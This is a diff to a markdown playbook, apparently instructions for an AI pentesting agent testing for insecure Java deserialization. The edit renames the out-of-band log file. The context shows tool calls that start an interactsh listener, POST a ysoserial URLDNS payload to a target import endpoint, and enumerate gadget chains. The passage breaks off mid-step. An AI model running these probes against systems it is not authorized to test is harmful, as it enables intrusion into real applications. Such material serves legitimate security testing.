@@ -52,9 +52,9 @@ import re
 print('classes:', re.findall(rb'[A-Za-z][A-Za-z0-9._\\$]+', b)[:40])
 """
    ```
-5. **Set up the OOB oracle.** Open an interactsh listener so blind chains have somewhere to land:
+5. **Set up the OOB oracle.** Open an interactsh listener so blind chains have somewhere to land: Replace `RUN` with a short random token you pick once for this workflow (for example the output of `openssl rand -hex 4`) and reuse it in every file name: all your chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks as this one's.
    ```
-   kali_shell command="interactsh-client -v -o /tmp/oast.log &"
+   kali_shell command="interactsh-client -v -o /tmp/oast-RUN.log &"
    ```
    Capture the issued domain (`*.oast.fun`) for use in URLDNS / DNS / HTTP gadgets in Phase 2.
 6. **Catalogue runtime libraries.** If the application leaks a stack trace, error page, or `/actuator/env` style endpoint, harvest it: the precise CommonsCollections version, Spring version, Hibernate version, Jackson version, or Symfony minor decides which gadget chain will land.
@@ -77,7 +77,7 @@ Pick the per-language track that matches the runtime. Each track follows the sam
    kali_shell command="base64 -w0 /tmp/urldns.bin > /tmp/urldns.b64"
    execute_curl url="https://target.tld/api/import" method="POST" headers='{"Content-Type":"application/x-java-serialized-object"}' body_file="/tmp/urldns.bin"
    ```
-   Watch `/tmp/oast.log` for a DNS hit on `canary.<OAST_ID>`. If it lands, the sink deserializes attacker bytes.
+   Watch `/tmp/oast-RUN.log` for a DNS hit on `canary.<OAST_ID>`. If it lands, the sink deserializes attacker bytes.
 2. **Pick a real gadget chain.** Use `kali_shell` to enumerate available chains, then mint one against your OAST domain so success/failure is observable even when stdout is suppressed:
    ```
    kali_shell command="ysoserial 2>&1 | head -60"
